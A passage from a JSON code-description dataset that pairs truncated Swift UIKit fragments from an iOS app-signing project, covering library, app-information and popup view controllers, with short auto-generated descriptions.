    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2359",
    "code": "private func showInstallConfirmationAlert(app: NSManagedObject, filePath: String) {\nlet alertController = UIAlertController(\ntitle: String.localized(\"LIBRARY_VIEW_CONTROLLER_SIGN_ACTION_INSTALL_CONFIRM\"),\nmessage: String.localized(\"LIBRARY_VIEW_CONTROLLER_SIGN_ACTION_INSTALL_CONFIRM_DESCRIPTION\"),\npreferredStyle: .alert\n)\n\nlet confirmAction = UIAlertAction(\ntitle: String.localized(\"INSTALL\"),\nstyle: .default",
    "nl": "Function showInstallConfirmationAlert - implements showinstallconfirmationalert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2360",
    "code": "private func configurePopupDetents(hasUpdate: Bool) {\nlet detentHeight = hasUpdate ? 150.0 : 270.0\nlet detent: UISheetPresentationController.Detent = ._detent(\nwithIdentifier: \"PopupDetent\",\nconstant: detentHeight\n)\n\nif let presentationController = popupVC.presentationController as? UISheetPresentationController {",
    "nl": "Function configurePopupDetents - implements configurepopupdetents functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2361",
    "code": "func startSigning(meow: NSManagedObject) {\n// Call the new method with the renamed parameter to avoid recursion\nstartSigning(app: meow)\n}\n\noverride func tableView(\n_: UITableView,\ntrailingSwipeActionsConfigurationForRowAt indexPath: IndexPath\n) -> UISwipeActionsConfiguration? {",
    "nl": "Function startSigning - implements startsigning functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2362",
    "code": "override func tableView(\n_: UITableView,\ntrailingSwipeActionsConfigurationForRowAt indexPath: IndexPath\n) -> UISwipeActionsConfiguration? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2363",
    "code": "override func tableView(\n_: UITableView,\ncontextMenuConfigurationForRowAt indexPath: IndexPath,\npoint _: CGPoint\n) -> UIContextMenuConfiguration? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2364",
    "code": "extension LibraryViewController {\n@objc func afetch() { fetchSources() }",
    "nl": "MARK: - Fetch Data Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2365",
    "code": "@objc func afetch() { fetchSources() }\n}\n\nextension LibraryViewController: UISearchResultsUpdating {",
    "nl": "Function afetch - implements afetch functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2366",
    "code": "extension LibraryViewController: UISearchResultsUpdating {\nfunc updateSearchResults(for searchController: UISearchController) {",
    "nl": "extension LibraryViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2367",
    "code": "func updateSearchResults(for searchController: UISearchController) {\nlet searchText = searchController.searchBar.text ?? \"\"\nfilterContentForSearchText(searchText)\ntableView.reloadData()\n}\n\nprivate func filterContentForSearchText(_ searchText: String) {",
    "nl": "Function updateSearchResults - updates searchresults",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2368",
    "code": "private func filterContentForSearchText(_ searchText: String) {\nlet lowercasedSearchText = searchText.lowercased()\n\nfilteredSignedApps = signedApps?.filter { app in",
    "nl": "Function filterContentForSearchText - implements filtercontentforsearchtext functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2369",
    "code": "extension LibraryViewController: UISearchControllerDelegate, UISearchBarDelegate {\nfunc setupSearchController() {",
    "nl": "extension LibraryViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2370",
    "code": "func setupSearchController() {\nsearchController = UISearchController(searchResultsController: nil)\nsearchController.obscuresBackgroundDuringPresentation = false\nsearchController.hidesNavigationBarDuringPresentation = true\nsearchController.searchResultsUpdater = self\nsearchController.delegate = self\nsearchController.searchBar.placeholder = String.localized(\"SETTINGS_VIEW_CONTROLLER_SEARCH_PLACEHOLDER\")\nnavigationItem.searchController = searchController\ndefinesPresentationContext = true\nnavigationItem.hidesSearchBarWhenScrolling = false",
    "nl": "Function setupSearchController - sets upsearchcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2371",
    "code": "extension LibraryViewController {\n/// https://stackoverflow.com/a/75310581\nfunc presentLoader() -> UIAlertController {",
    "nl": "Extension to provide loading alert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2372",
    "code": "func presentLoader() -> UIAlertController {\nlet alert = UIAlertController(title: nil, message: \"\", preferredStyle: .alert)\nlet activityIndicator = UIActivityIndicatorView(style: .large)\nactivityIndicator.translatesAutoresizingMaskIntoConstraints = false\nactivityIndicator.isUserInteractionEnabled = false\nactivityIndicator.startAnimating()\n\nalert.view.addSubview(activityIndicator)\n\nNSLayoutConstraint.activate([",
    "nl": "/ https://stackoverflow.com/a/75310581",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2373",
    "code": "class AppsInformationViewController: UIViewController {\nvar tableView: UITableView!\n\nvar tableData = [\n[\nString.localized(\"APPS_INFORMATION_TITLE_NAME\"),\nString.localized(\"APPS_INFORMATION_TITLE_VERSION\"),\nString.localized(\"APPS_INFORMATION_TITLE_IDENTIFIER\"),\n// String.localized(\"APPS_INFORMATION_TITLE_SIZE\")\n],",
    "nl": "class AppsInformationViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2374",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupViews()\nsetupNavigation()\n}\n\nprivate func setupViews() {",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2375",
    "code": "private func setupViews() {\ntableView = UITableView(frame: .zero, style: .insetGrouped)\ntableView.translatesAutoresizingMaskIntoConstraints = false\ntableView.dataSource = self\ntableView.delegate = self\ntableView.tableHeaderView = configureHeaderView()\n\nif !FileManager.default.fileExists(atPath: filePath.path) {",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2376",
    "code": "private func configureHeaderView() -> UIView {\nlet headerView = UIView(frame: CGRect(x: 0, y: 0, width: view.frame.width, height: 100))\nheaderView.backgroundColor = .clear\n\nif let iconURL = source.value(forKey: \"iconURL\") as? String {",
    "nl": "Function configureHeaderView - implements configureheaderview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2377",
    "code": "private func setupNavigation() {\ntitle = nil\nnavigationItem.rightBarButtonItem = UIBarButtonItem(\nbarButtonSystemItem: .close,\ntarget: self,\naction: #selector(closeSheet)\n)\n}\n\n@objc func closeSheet() {",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2378",
    "code": "@objc func closeSheet() {\ndismiss(animated: true, completion: nil)\n}\n\nfunc scrollViewDidScroll(_ scrollView: UIScrollView) {",
    "nl": "Function closeSheet - implements closesheet functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2379",
    "code": "func scrollViewDidScroll(_ scrollView: UIScrollView) {\nlet threshold: CGFloat = 40\n\nif scrollView.contentOffset.y > threshold {",
    "nl": "Function scrollViewDidScroll - implements scrollviewdidscroll functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2380",
    "code": "extension AppsInformationViewController: UITableViewDelegate, UITableViewDataSource {\nfunc numberOfSections(in _: UITableView) -> Int {",
    "nl": "extension AppsInformationViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2381",
    "code": "func numberOfSections(in _: UITableView) -> Int {\nreturn sectionTitles.count\n}\n\nfunc tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2382",
    "code": "func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nreturn tableData[section].count\n}\n\nfunc tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2383",
    "code": "func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {\nreturn sectionTitles[section]\n}\n\nfunc tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2384",
    "code": "func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {\nreturn sectionTitles[section].isEmpty ? 5 : 40\n}\n\nfunc tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2385",
    "code": "func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {\nlet title = sectionTitles[section]\nreturn InsetGroupedSectionHeader(title: title)\n}\n\nfunc tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2386",
    "code": "func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {\nswitch section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2387",
    "code": "func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet reuseIdentifier = \"Cell\"\nvar cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)\ncell.accessoryType = .none\ncell.selectionStyle = .none\n\nlet cellText = tableData[indexPath.section][indexPath.row]\ncell.textLabel?.text = cellText\n\nswitch cellText {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2388",
    "code": "func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nlet itemTapped = tableData[indexPath.section][indexPath.row]\n\nswitch itemTapped {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2389",
    "code": "extension PopupViewController {\n/// Configures the sheet presentation controller to display the popup properly\n/// - Parameter hasUpdate: Whether the popup is displaying an update option\nfunc configureSheetPresentation(hasUpdate: Bool = false) {",
    "nl": "Extension to fix popup presentation issues",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+Fix.swift",
    "code_type": "extension"
  },
  {
    "id": "2390",
    "code": "func configureSheetPresentation(hasUpdate: Bool = false) {\nif let sheet = sheetPresentationController {",
    "nl": "/ Configures the sheet presentation controller to display the popup properly / - Parameter hasUpdate: Whether the popup is displaying an update option",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+Fix.swift",
    "code_type": "function"
  },
  {
    "id": "2391",
    "code": "private func calculateRequiredHeight() -> CGFloat {\n// Base padding (top and bottom)\nlet basePadding: CGFloat = 40.0\n\n// Use fixed button count since we can't access the private stackView\nlet buttonCount = 2 // Default count, adjust if needed for your use case\n\n// Height per button plus spacing\nlet buttonHeight: CGFloat = 50.0\nlet buttonSpacing: CGFloat = 8.0 // Default spacing",
    "nl": "/ Calculates the required height based on buttons content / - Returns: Appropriate height for the popup sheet",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+Fix.swift",
    "code_type": "function"
  },
  {
    "id": "2392",
    "code": "func configureButtonsWithLayout(_ buttons: [PopupViewControllerButton]) {\n// Use the public interface to configure buttons\nconfigureButtons(buttons)\n\n// Add bottom constraint to ensure proper sizing of the popup\nif let lastButton = buttons.last, lastButton.superview != nil {",
    "nl": "/ Enhanced button configuration with proper layout and spacing / - Parameter buttons: Array of buttons to display in popup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+Fix.swift",
    "code_type": "function"
  },
  {
    "id": "2393",
    "code": "extension PopupViewController {\n/// Apply essential fixes to prevent crashes and improve functionality\nfunc applyMenuFixes() {",
    "nl": "/ Extension to fix popup menu sizing and presentation issues",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "extension"
  },
  {
    "id": "2394",
    "code": "func applyMenuFixes() {\n// Fix button layout and sizing\nadjustButtonLayout()\n\n// Add LED effects to buttons\napplyLEDEffectsToButtons()\n\n// Prevent popup from disappearing during app state changes\nsetupBackgroundHandling()\n",
    "nl": "/ Apply essential fixes to prevent crashes and improve functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2395",
    "code": "private func fixSheetPresentation() {\nif let sheet = sheetPresentationController {",
    "nl": "/ Fix sizing and presentation issues with the popup sheet",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2396",
    "code": "func configurePopupDetents(hasUpdate: Bool = false) {\n// Get sheet presentation controller if available\nif let sheet = sheetPresentationController {",
    "nl": "/ Configure a popup for proper sizing and presentation / - Parameter hasUpdate: Whether this popup contains update options (affects sizing)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2397",
    "code": "private func calculateRequiredHeight(buttonCount: Int, hasUpdate: Bool) -> CGFloat {\n// Base padding (top and bottom margins)\nlet basePadding: CGFloat = hasUpdate ? 60.0 : 40.0\n\n// Button heights and spacing\nlet buttonHeight: CGFloat = 50.0\nlet buttonSpacing: CGFloat = 10.0\nlet totalButtonsHeight = CGFloat(buttonCount) * buttonHeight\nlet totalSpacingHeight = CGFloat(max(0, buttonCount - 1)) * buttonSpacing\n",
    "nl": "/ Calculate the appropriate height for the popup based on its content / - Parameters: /   - buttonCount: Number of buttons in the popup /   - hasUpdate: Whether this is an update popup (affects sizing) / - Returns: The calculated height",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2398",
    "code": "private func adjustButtonLayout() {\n// Set consistent button height\nlet buttonHeight: CGFloat = 50\n\n// Ensure proper button sizing\nfor subview in stackView.arrangedSubviews {",
    "nl": "/ Adjust button layout to fix oversized menu issues",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2399",
    "code": "func configureButtons(_ buttons: [PopupViewControllerButton]) {\n// Remove any existing buttons\nstackView.arrangedSubviews.forEach { $0.removeFromSuperview() }",
    "nl": "/ Configure buttons with proper constraints for popup sizing / - Parameter buttons: Array of buttons to display",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2400",
    "code": "private func applyLEDEffectsToButtons() {\nfor (index, subview) in stackView.arrangedSubviews.enumerated() {",
    "nl": "/ Apply LED effects to buttons for better visual appearance",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2401",
    "code": "private func setupBackgroundHandling() {\n// Add notification observers\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(handleAppStateChange),\nname: UIApplication.willResignActiveNotification,\nobject: nil\n)\n\nNotificationCenter.default.addObserver(",
    "nl": "/ Setup handler for app backgrounding to prevent crashes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2402",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Register for app state notifications\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(handleAppDidBecomeActive),\nname: UIApplication.didBecomeActiveNotification,\nobject: nil\n)",
    "nl": "/ Ensure popup doesn't get dismissed inappropriately during app state changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2403",
    "code": "override func viewWillDisappear(_ animated: Bool) {\nsuper.viewWillDisappear(animated)\n\n// Remove observers when view disappears\nNotificationCenter.default.removeObserver(\nself,\nname: UIApplication.didBecomeActiveNotification,\nobject: nil\n)\n}",
    "nl": "Function viewWillDisappear - implements viewwilldisappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2404",
    "code": "@objc private func handleAppStateChange(_ notification: Notification) {\nif notification.name == UIApplication.willResignActiveNotification {",
    "nl": "MARK: - Application State Handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2405",
    "code": "@objc private func handleAppDidBecomeActive() {\n// Fix presentation issues that might occur when app returns to foreground\nif let presentationController = presentationController as? UISheetPresentationController {",
    "nl": "Function handleAppDidBecomeActive - implements handleappdidbecomeactive functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2406",
    "code": "func safeHandleAppSigning(app: NSManagedObject, viewController: UIViewController) {\n// Properly dismiss the popup first\ndismiss(animated: true) {",
    "nl": "MARK: - Sign Button Fix / Fixed implementation for handling app signing that prevents crash / - Parameters: /   - app: The app to sign /   - viewController: The parent view controller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2407",
    "code": "private func fallbackSigningPresentation(for app: NSManagedObject, from viewController: UIViewController) {\n// Log fallback\nDebug.shared.log(message: \"Using fallback signing presentation\", type: .warning)\n\n// Create signing options with current user defaults\nlet signingDataWrapper = SigningDataWrapper(signingOptions: UserDefaults.standard.signingOptions)\n\n// If we can cast to DownloadedApps, proceed with signing\nif let downloadedApp = app as? DownloadedApps,\nlet libraryVC = viewController.navigationController?.viewControllers",
    "nl": "/ Fallback method if we're not using LibraryViewController / - Parameters: /   - app: The app to sign /   - viewController: The view controller to present from",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift",
    "code_type": "function"
  },
  {
    "id": "2408",
    "code": "class PopupViewController: UIViewController {\n// Changed from private to fileprivate to allow access from extensions in same file\n// Use internal (default) access level to allow access from other files\nlet stackView = UIStackView()\n\noverride func viewDidLoad() {",
    "nl": "class PopupViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2409",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nview.backgroundColor = .systemBackground\nsetupStackView()\n}\n\nprivate func setupStackView() {",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2410",
    "code": "private func setupStackView() {\nstackView.axis = .vertical\nstackView.spacing = 10\nstackView.alignment = .fill\nstackView.distribution = .fillEqually\nstackView.translatesAutoresizingMaskIntoConstraints = false\n\nview.addSubview(stackView)\n\nNSLayoutConstraint.activate([",
    "nl": "Function setupStackView - sets upstackview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2411",
    "code": "func configureButtons(_ buttons: [UIButton]) {\nstackView.arrangedSubviews.forEach { $0.removeFromSuperview() }",
    "nl": "Function configureButtons - implements configurebuttons functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2412",
    "code": "class PopupViewControllerButton: UIButton {\n// MARK: - Properties\n\nvar onTap: (() -> Void)?\nprivate var originalBackgroundColor: UIColor?\nprivate let feedbackGenerator = UIImpactFeedbackGenerator(style: .medium)\nprivate let gradientLayer = CAGradientLayer()\n\n// MARK: - Initialization\n",
    "nl": "class PopupViewControllerButton - implements functionality related to popup view controller button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2413",
    "code": "private func addButtonTargets() {\naddTarget(self, action: #selector(handleButtonPressEvent), for: .touchDown)\naddTarget(self, action: #selector(handleButtonReleaseEvent), for: .touchUpInside)\naddTarget(self, action: #selector(handleButtonReleaseEvent), for: .touchUpOutside)\naddTarget(self, action: #selector(buttonCancelled), for: .touchCancel)\naddTarget(self, action: #selector(buttonTapped), for: .touchUpInside)\n}\n\nprivate func setupButton(title: String, color: UIColor, titlecolor: UIColor) {",
    "nl": "MARK: - Setup Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2414",
    "code": "private func setupButton(title: String, color: UIColor, titlecolor: UIColor) {\n// Store original color\noriginalBackgroundColor = color\n\n// Basic appearance\nsetTitle(title, for: .normal)\nsetTitleColor(titlecolor, for: .normal)\ntitleLabel?.font = UIFont.systemFont(ofSize: 16, weight: .semibold)\n\n// Modern shape with continuous corners",
    "nl": "Function setupButton - sets upbutton",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2415",
    "code": "private func setupGradient(withBaseColor color: UIColor) {\n// Create a subtle gradient variation of the base color\nlet topColor = color.lighter(by: 10).cgColor\nlet bottomColor = color.darker(by: 10).cgColor\n\ngradientLayer.colors = [topColor, bottomColor]\ngradientLayer.locations = [0.0, 1.0]\ngradientLayer.startPoint = CGPoint.zero\ngradientLayer.endPoint = CGPoint(x: 0.0, y: 1.0)\ngradientLayer.frame = bounds",
    "nl": "Function setupGradient - sets upgradient",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2416",
    "code": "private func colorIsCloseToAccent(_ color: UIColor) -> Bool {\n// Check if the color is similar to our accent color\nlet accentColor = UIColor(hex: \"#FF6482\")\n\nvar r1: CGFloat = 0, g1: CGFloat = 0, b1: CGFloat = 0, a1: CGFloat = 0\nvar r2: CGFloat = 0, g2: CGFloat = 0, b2: CGFloat = 0, a2: CGFloat = 0\n\ncolor.getRed(&r1, green: &g1, blue: &b1, alpha: &a1)\naccentColor.getRed(&r2, green: &g2, blue: &b2, alpha: &a2)\n",
    "nl": "Function colorIsCloseToAccent - implements colorisclosetoaccent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2417",
    "code": "@objc func handleButtonPressEvent() {\n// Visual feedback\nUIView.animate(withDuration: 0.2, delay: 0, options: [.curveEaseInOut], animations: {",
    "nl": "MARK: - Action Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2418",
    "code": "@objc func handleButtonReleaseEvent() {\n// Visual feedback\nUIView.animate(\nwithDuration: 0.2,\ndelay: 0,\nusingSpringWithDamping: 0.7,\ninitialSpringVelocity: 0.5,\noptions: [],\nanimations: {",
    "nl": "Function handleButtonReleaseEvent - implements handlebuttonreleaseevent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2419",
    "code": "@objc private func buttonCancelled() {\n// Reset button state without animation\ntransform = .identity\nlayer.shadowOpacity = 0.2\nalpha = 1.0\n\nif gradientLayer.superlayer != nil {",
    "nl": "Function buttonCancelled - implements buttoncancelled functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
